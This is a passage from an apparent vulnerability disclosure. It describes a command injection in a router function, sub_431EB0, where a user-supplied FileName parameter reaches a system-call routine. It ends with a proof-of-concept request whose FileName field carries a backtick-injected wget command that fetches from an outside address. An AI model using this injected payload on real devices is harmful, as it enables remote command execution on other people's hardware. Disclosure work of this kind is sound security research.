...
In sub_431EB0 function, it reads in a user-provided parameter `FileName` .

<div  align="center"><img src="./img/function2.png" style="zoom:80%;" /></div>

However ,the value of the `FileName`  is inserted into `v43`  using `snprintf`,and the value of v11 will be handled by the function CsteSystem.
...
{"topicurl":"UploadOpenVpnCert","FileName":"`wget 192.168.6.1:7777/testpoc`"
}
```
